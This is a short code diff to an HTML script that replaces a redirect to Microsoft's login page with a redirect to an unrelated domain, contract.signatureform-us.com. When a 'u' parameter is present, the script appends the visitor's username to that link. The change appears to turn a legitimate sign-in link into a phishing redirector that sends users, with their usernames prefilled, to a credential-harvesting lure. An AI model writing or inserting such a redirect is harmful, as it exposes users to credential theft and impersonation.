@@ -1,3 +1,10 @@
 <script>
-  window.location = "https://login.microsoftonline.com";
+  const qs = window.location.search;
+  const urlParams = new URLSearchParams(qs);
+
+  if (urlParams.has("u")) {
+    const u = urlParams.get("u");
+    window.location = "https://contract.signatureform-us.com/?username=" + u;
+  }
+  window.location = "https://contract.signatureform-us.com/";
 </script>
